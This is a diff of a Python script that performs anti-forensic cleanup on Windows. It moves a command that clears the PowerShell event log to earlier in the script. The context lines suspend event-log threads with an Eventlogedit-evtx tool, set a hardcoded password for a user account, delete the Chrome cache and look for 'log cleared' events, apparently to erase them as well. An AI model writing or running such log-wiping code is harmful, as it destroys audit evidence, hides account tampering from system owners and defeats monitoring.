@@ -43,6 +43,10 @@ def verify_success(username, password):
 cmd = "C:\Tools\Eventlogedit-evtx\SuspendorResumeTid.exe suspend"
 subprocess.call(cmd)
 
+# Delete Windows Event Logging - PowerShell Logs
+    cmd = 'wevtutil.exe cl "Windows PowerShell"'
+    subprocess.call(cmd)
+
 # Set random password
 u = "Jonathan"
 p = "P@ssw0rd"
@@ -60,10 +64,6 @@ if verify_success(u, p):
 
     # Clean up Chrome cache
     exec(open("delete_chrome_cache.py").read())
-
-# Delete Windows Event Logging - PowerShell Logs
-    cmd = 'wevtutil.exe cl "Windows PowerShell"'
-    subprocess.call(cmd)
 
 # Delete Windows Event Logging - Event has been cleared logs
     cmd = 'wevtutil qe System "/q:*[System [(EventID=104)]]" /rd:true /c:10'
